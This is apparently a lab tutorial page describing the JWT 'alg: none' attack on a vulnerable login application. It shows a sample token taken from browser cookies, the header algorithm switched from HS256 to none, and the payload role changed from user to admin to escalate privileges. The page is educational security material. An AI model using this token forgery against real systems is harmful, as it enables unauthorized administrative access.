---
sidebar_position: 3
---

# JWT (NONE)


:::info Vulnerable Application Scenario

We start with a Login Application. After the Login we get a `JWT Token`.

:::


<br/>
<br/>

- **Grab The JWT Token:**
	- **Browser:** `Storage:Cookies:JWT Token`


```js
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ0MjU5NTYzNDM4LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk3LjAuNDY5Mi45OSBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDQyNTk1NjN9.OLPDohoBHorLhsiF2UjefxUOdsHc98oSrbYBHOGVwMA
```

<br/>

- **Change Token Algorithm && User Role:**
	- **Algorithm:** `"alg": "none"`


```js
{
  "typ": "JWT",
  "alg": "HS256"  🠔  none
}
```

<br/>


- **User Role:**
	- `"role": "admin"`

```js
{
  "auth": 1644259563438,
  "agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
  "role": "user",  🠔  admin
  "iat": 1644259563
}
```

<br/>

- **Reload The Page to Check for Results**